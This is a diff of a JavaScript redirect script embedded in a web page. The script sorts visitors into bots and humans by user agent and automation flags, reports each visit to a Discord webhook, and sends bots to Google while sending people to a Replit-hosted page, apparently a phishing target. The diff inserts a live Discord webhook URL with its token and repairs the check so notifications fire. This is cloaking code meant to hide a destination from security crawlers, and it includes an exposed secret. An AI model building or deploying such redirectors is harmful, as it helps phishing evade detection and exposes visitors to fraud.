@@ -7,11 +7,12 @@
     <script>
     (function() {
         // --- CONFIGURACIÓN ---
-        const DISCORD_WEBHOOK_URL = "TU_WEBHOOK_URL_AQUÍ";
+        // 1. Aquí va tu webhook real:
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546559728786612264/dkFVrRiTobni3TEL9Ko6_nk6VIQQSn2_I8t6gyTXzVuFTi3BAND5J8R-AHYCK_-NNR_6";
 
         const userAgent = navigator.userAgent.toLowerCase();
         
-        // 1. Lista de palabras clave de bots y rastreadores comunes
+        // Lista de palabras clave de bots
         const botsKeywords = [
             'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
             'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver', 
@@ -19,10 +20,8 @@
             'spider', 'crawler', 'robot', 'fetch', 'headless', 'python', 'curl'
         ];
 
-        // Comprobar si el navegador coincide con un bot por el User-Agent
         const esBotPorUserAgent = botsKeywords.some(bot => userAgent.includes(bot));
 
-        // 2. Detección de automatización básica
         const esBotPorNavegador = (
             navigator.webdriver === true || 
             window._phantom || 
@@ -34,7 +33,7 @@
 
         const esBot = esBotPorUserAgent || esBotPorNavegador;
 
-        // 3. Detección básica del dispositivo
+        // Detección de dispositivo
         let dispositivo = "Escritorio (PC/Laptop)";
         if (/iphone|ipad|ipod/.test(userAgent)) {
             dispositivo = "iOS (iPhone/iPad)";
@@ -44,10 +43,9 @@
             dispositivo = "Dispositivo Móvil";
         }
 
-        // 4. Enviar mensaje a Discord mediante Embed
         function notificarDiscord(esBot, dispositivo, callbackRedireccion) {
-            // Si no se ha configurado la URL, redirigir directamente
-            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("https://discord.com/api/webhooks/1546559728786612264/dkFVrRiTobni3TEL9Ko6_nk6VIQQSn2_I8t6gyTXzVuFTi3BAND5J8R-AHYCK_-NNR_6")) {
+            // 2. Comprobación correcta: sólo omitir si está vacío o si NO se ha cambiado el texto genérico
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("TU_WEBHOOK_URL_AQUÍ")) {
                 callbackRedireccion();
                 return;
             }
@@ -55,7 +53,7 @@
             const payload = {
                 embeds: [{
                     title: esBot ? "🤖 Bot Detectado" : "👤 Nueva Visita Real",
-                    color: esBot ? 15158332 : 3066993, // Rojo si es bot, Verde si es persona
+                    color: esBot ? 15158332 : 3066993,
                     fields: [
                         { name: "Tipo de Visitante", value: esBot ? "`BOT / Crawler`" : "`Persona Real`", inline: true },
                         { name: "Dispositivo", value: `\`${dispositivo}\``, inline: true },
@@ -66,7 +64,6 @@
                 }]
             };
 
-            // Intentar enviar con fetch keepalive para asegurar la entrega antes de la redirección
             fetch(DISCORD_WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -79,11 +76,9 @@
                 callbackRedireccion();
             });
 
-            // Tiempo límite de seguridad (500ms) para no congelar la pantalla si Discord tarda en responder
             setTimeout(callbackRedireccion, 500);
         }
 
-        // 5. Determinar la URL destino y ejecutar notificación + redirección
         const urlDestino = esBot 
             ? "https://www.google.com" 
             : "https://web-hola-mundo--johnathanaa0.replit.app/BDV2/";
